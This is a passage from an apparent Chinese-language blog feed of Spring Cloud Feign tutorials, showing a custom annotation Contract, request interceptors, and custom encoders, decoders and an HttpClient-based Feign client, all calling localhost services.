<p>在两个XXXClient中，我们使用了注解FeignClient，并且声明了需要调用的服务名称。另外，我们还使用了Spring的注解RequestMapping，这意味着，我们需要一个翻译器Contract，让Feign知道Spring的这个注解的含义。</p>
<p>最后，除了@RequestMapping注解外，默认还支持@RequestParam、@RequestHeader和@PathVariable这三个参数注解。</p>
<p>需要注意的是，使用了Spring Cloud的“翻译器”后，将不能再使用Feign的默认注解。</p>
<p>让我们看一下，“翻译器”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyContract</span> <span class="keyword">extends</span> <span class="title">SpringMvcContract</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 用于处理方法级的注解</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAnnotationOnMethod</span><span class="params">(MethodMetadata data,</span></span></span><br><span class="line"><span class="function"><span class="params">			Annotation annotation, Method method)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 调用父类的方法，吗时支持 @RequestMapping 注解</span></span><br><span class="line">		<span class="keyword">super</span>.processAnnotationOnMethod(data, annotation, method);	</span><br><span class="line">		<span class="comment">// 是MyUrl注解才进行处理</span></span><br><span class="line">		<span class="keyword">if</span>(MyUrl<span class="class">.<span class="keyword">class</span>.<span class="title">isInstance</span>(<span class="title">annotation</span>)) </span>&#123;</span><br><span class="line">			<span class="comment">// 获取注解的实例</span></span><br><span class="line">			MyUrl myUrlAnn = method.getAnnotation(MyUrl<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">			<span class="comment">// 获取配置的HTTP方法</span></span><br><span class="line">			String httpMethod = myUrlAnn.method();</span><br><span class="line">			<span class="comment">// 获取服务的url</span></span><br><span class="line">			String url = myUrlAnn.url();</span><br><span class="line">			<span class="comment">// 将值设置到模板中</span></span><br><span class="line">			data.template().method(httpMethod);</span><br><span class="line">			data.template().append(url);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这边的翻译器继承了SpringMVCContract，并且重载了processAnnotationOnMethod方法，但是，在方法的最前面又调用了父类方法。这就意味着，它不仅支持翻译Spring的注解，也支持翻译自定义的MyUrl注解。</p>
<p>MyUrl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(METHOD)</span><br><span class="line"><span class="meta">@Retention</span>(RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyUrl &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 定义url与method属性</span></span><br><span class="line">	<span class="function">String <span class="title">url</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">String <span class="title">method</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着，我们过一下Controller的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> PersonClient personClient;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/invokeHello"</span>, method = RequestMethod.GET)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">invokeHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> personClient.hello();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/router"</span>, method = RequestMethod.GET, </span><br><span class="line">			produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">	<span class="meta">@ResponseBody</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">router</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 调用服务提供者的接口</span></span><br><span class="line">		Person p = personClient.getPerson(<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">return</span> p.getMessage();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> HelloClient helloClient;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/testContract"</span>, method = RequestMethod.GET, </span><br><span class="line">			produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">	<span class="meta">@ResponseBody</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">testContract</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		String springResult = helloClient.springHello();</span><br><span class="line">		System.out.println(<span class="string">"使用 @RequestMapping 注解的接口返回结果："</span> + springResult);</span><br><span class="line">		String myResult = helloClient.myHello();</span><br><span class="line">		System.out.println(<span class="string">"使用 @MyUrl 注解的接口返回结果："</span> + myResult);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 测试请求拦截器</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/testInterceptors"</span>, method = RequestMethod.GET, </span><br><span class="line">			produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">	<span class="meta">@ResponseBody</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">testInterceptors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		String springResult = helloClient.springHello();</span><br><span class="line">		<span class="keyword">return</span> springResult;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面使用了@Autowired注解，注入了HelloClient和PersonClient。</p>
<p>配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9000</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">spring-feign-invoker</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka/</span></span><br></pre></td></tr></table></figure>

<p>启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SpringApplication.run(InvokerApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>我们按照下面的顺序启动三个组件</p>
<ol>
<li>spring-feign-server</li>
<li>spring-feign-provider</li>
<li>spring-feign-invoker</li>
</ol>
<p>启动完毕后，可以在Eureka的管理界面看到注册的三个服务</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign4.png" alt></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>可以在浏览器中输入<a href="http://localhost:9000/invokeHello或者http://localhost:9000/router" target="_blank" rel="noopener">http://localhost:9000/invokeHello或者http://localhost:9000/router</a></p>
<p>我们可以得到下面的结果</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign5.png" alt></p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign6.png" alt></p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign7.png" alt></p>
<p>可以看到，SpringCloud提供的Feign客户端是具有负载均衡功能的。Spring Cloud实现的Feign客户端，类名为LoadBalancerFeignClient，在该类中维护者与SpringClientFactory相关的实例。通过SpringClientFactory可以获取负载均衡器，负载均衡器会根据一定的规则来选取处理请求的服务器，最终实现负载均衡功能。</p>
<p>我们还可以通过Spring的@Bean注解实现自定义配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回一个自定义的注解翻译器</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Contract <span class="title">feignContract</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyContract();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RequestInterceptor <span class="title">getRequestInterceptorsA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="keyword">new</span> RequestInterceptor() &#123;</span><br><span class="line"></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(RequestTemplate template)</span> </span>&#123;</span><br><span class="line">				System.out.println(<span class="string">"这是第一个请求拦截器"</span>);</span><br><span class="line">			&#125;    		</span><br><span class="line">    	&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RequestInterceptor <span class="title">getRequestInterceptorsB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="keyword">new</span> RequestInterceptor() &#123;</span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(RequestTemplate template)</span> </span>&#123;</span><br><span class="line">				System.out.println(<span class="string">"这是第二个请求拦截器"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">    	&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要实现自定义的“翻译器”或者拦截器，只要实现一个返回对应类型的方法，加上注解@Bean即可。比如，实现一个返回Contact的方法，用@Bean标记，就可以自定义“翻译器”了。拦截器也同样道理，具体可参见上面的代码。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href>疯狂Spring Cloud微服务架构实战</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring</tag>
        <tag>Feign</tag>
      </tags>
  </entry>
  <entry>
    <title>Feign入门</title>
    <url>/2020/04/24/SpringCloud/2020-04-24-008-Feign%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="Feign入门"><a href="#Feign入门" class="headerlink" title="Feign入门"></a>Feign入门</h1><p>Feign是Github上的一个开源项目，目的是简化Web Service客户端的开发。在使用Feign时，可以使用注解来修饰接口，被注解修饰的接口具有访问Web Service的能力。这些注解中既包括Feign自带的注解，也支持使用第三方注解。除此之外，Feign还支持插件式的编码器和解码器，使用者可以通过该特性对请求和响应进行不同和的封装和解封。</p>
<h2 id="第一个Feign程序"><a href="#第一个Feign程序" class="headerlink" title="第一个Feign程序"></a>第一个Feign程序</h2><h3 id="Feign-Client-端代码"><a href="#Feign-Client-端代码" class="headerlink" title="Feign-Client 端代码"></a>Feign-Client 端代码</h3><p>新建一个Maven项目Feign-Client，作为请求发起端，其pom依赖为:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.16.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.netflix.feign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-gson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.18.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后新建一个接口，命名为HelloClient，添加以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /hello"</span>)</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注解@RequestLine表示使用GET方法向/hello发送请求。</p>
<p>接着再新建一个接口，命名为PersonClient，添加以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /person/&#123;personId&#125;"</span>)</span><br><span class="line">    <span class="function">Person <span class="title">findById</span><span class="params">(@Param(<span class="string">"personId"</span>)</span> Integer personId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，注解@RequestLine表示使用GET方法，向链接/person/{personId}发送请求。</p>
<p>其中Person对象的代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    String message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，编写测试代码，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloClient test = Feign.builder().target(HelloClient.class, "http://localhost:8080/");</span><br><span class="line">        System.out.println(test.sayHello());</span><br><span class="line"></span><br><span class="line">        PersonClient personClient = Feign.builder().decoder(new GsonDecoder()).target(PersonClient.class, "http://localhost:8080");</span><br><span class="line">        Person person = personClient.findById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(person.id);</span><br><span class="line">        System.out.println(person.age);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">        System.out.println(person.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，我们使用了Feign创建了HelloClient和PersonClient的实例，接着调用接口定义的方法。Feign就会替我们生成动态代理类，生成的代理类会将请求的信息封装，交给feign.client接口发送请求，而该接口的默认实现类最终会使用java.net.HttpURLConnection来发送HTTP请求。</p>
<h3 id="Feign-Server端代码"><a href="#Feign-Server端代码" class="headerlink" title="Feign-Server端代码"></a>Feign-Server端代码</h3><p>接着，创建一个服务端代码，提供/hello和/person/{personId}这两个接口。因为比较简单，就直接贴代码了。</p>
<h4 id="pom文件"><a href="#pom文件" class="headerlink" title="pom文件"></a>pom文件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>Dalston.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="接口Controller"><a href="#接口Controller" class="headerlink" title="接口Controller"></a>接口Controller</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstCloudController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/person/&#123;personId&#125;"</span>, method = RequestMethod.GET,</span><br><span class="line">            produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">findPerson</span><span class="params">(@PathVariable(<span class="string">"personId"</span>)</span> Integer personId, HttpServletRequest request) </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(personId, <span class="string">"Crazyit"</span>, <span class="number">30</span>);</span><br><span class="line">        person.setMessage(request.getRequestURL().toString());</span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/hello"</span>, method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello, hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="启动类"><a href="#启动类" class="headerlink" title="启动类"></a>启动类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstCloudServiceProvider</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String port = scanner.nextLine();</span><br><span class="line">        new SpringApplicationBuilder(FirstCloudServiceProvider.class).properties("server.port=" + port).run(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行客户端请求"><a href="#运行客户端请求" class="headerlink" title="运行客户端请求"></a>运行客户端请求</h3><p>运行Client的主方法，可以得到如下结果：</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign.png" alt="运行结果"></p>
<h2 id="实现自定义的编码和解码器"><a href="#实现自定义的编码和解码器" class="headerlink" title="实现自定义的编码和解码器"></a>实现自定义的编码和解码器</h2><p>Feign插件式编码器与解码器可以对请求以及结果进行处理。对于一些特殊的要求，可以使用自定义的编码器和解码器。实现自定义的编码器，需要实现Encoder接口的encode方法。</p>
<h3 id="实现自定义encoder"><a href="#实现自定义encoder" class="headerlink" title="实现自定义encoder"></a>实现自定义encoder</h3><p>下面是一个自定义编码器的实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyEncoder</span> <span class="keyword">implements</span> <span class="title">Encoder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> GsonEncoder gsonEncoder;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyEncoder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        gsonEncoder = <span class="keyword">new</span> GsonEncoder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(Object o, Type type, RequestTemplate requestTemplate)</span> <span class="keyword">throws</span> EncodeException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"encode object is class"</span> + type.getClass().getName());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"encode object is value"</span> + type);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"encode bodyType is class"</span> + type.getClass().getName());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"encode bodyType is value"</span> + type);</span><br><span class="line"></span><br><span class="line">        gsonEncoder.encode(o, type, requestTemplate);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实现自定义decoder"><a href="#实现自定义decoder" class="headerlink" title="实现自定义decoder"></a>实现自定义decoder</h3><p>实现自定义解码器，需要实现Decoder接口的decode方法。下面是一个自定义编码器的简易实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDecoder</span> <span class="keyword">implements</span> <span class="title">Decoder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> GsonDecoder gsonDecoder;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyDecoder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        gsonDecoder= <span class="keyword">new</span> GsonDecoder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">decode</span><span class="params">(Response response, Type type)</span> <span class="keyword">throws</span> IOException, FeignException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gsonDecoder.decode(response,type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，在测试类中添加如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloClient test = Feign.builder().encoder(new MyEncoder()).target(HelloClient.class, "http://localhost:8080/");</span><br><span class="line">        System.out.println(test.sayHello());</span><br><span class="line"></span><br><span class="line">        PersonClient personClient = Feign.builder().decoder(new MyDecoder()).target(PersonClient.class, "http://localhost:8080");</span><br><span class="line">        Person person = personClient.findById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(person.id);</span><br><span class="line">        System.out.println(person.age);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">        System.out.println(person.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后得到运行结果</p>
<p><img src="https://huhansi.github.io/images/2020-04-24-feign.png" alt="运行结果"></p>
<h2 id="实现自定义的Feign客户端"><a href="#实现自定义的Feign客户端" class="headerlink" title="实现自定义的Feign客户端"></a>实现自定义的Feign客户端</h2><p>Feign使用一个Client接口来发送请求，默认情况下，使用HttpURLConnection连接Http服务。与编码器类似，客户端也采用插件式设计，也就是说，我们可以实现自己的客户端。只要实现Feign的Client接口并实现它的execute方法即可。</p>
<p>下面我们自己实现一个简单的HttpClient客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MyFeignClient implements Client &#123;</span><br><span class="line">    public Response execute(Request request, Request.Options options) throws IOException &#123;</span><br><span class="line">        System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  这是自定义的Feign客户端&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 创建一个默认的客户端</span><br><span class="line">            CloseableHttpClient httpClient &#x3D; HttpClients.createDefault();</span><br><span class="line">            final String method &#x3D; request.method();</span><br><span class="line">            &#x2F;&#x2F; 创建一个HttpClient的HttpRequest</span><br><span class="line">            HttpRequestBase httpRequest &#x3D; new HttpRequestBase() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public String getMethod() &#123;</span><br><span class="line">                    return method;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            &#x2F;&#x2F; 设置请求地址</span><br><span class="line">            httpRequest.setURI(new URI(request.url()));</span><br><span class="line">            &#x2F;&#x2F; 执行请求，获取响应</span><br><span class="line">            HttpResponse httpResponse &#x3D; httpClient.execute(httpRequest);</span><br><span class="line">            &#x2F;&#x2F; 获取响应的主体内容</span><br><span class="line">            byte[] body &#x3D; EntityUtils.toByteArray(httpResponse.getEntity());</span><br><span class="line">            Response response &#x3D; Response.builder().body(body).headers(new HashMap&lt;String, Collection&lt;String&gt;&gt;()).status(httpResponse.getStatusLine().getStatusCode()).build();</span><br><span class="line">            return response;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new IOException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们在测试类中使用自定义的Feign Client</p>
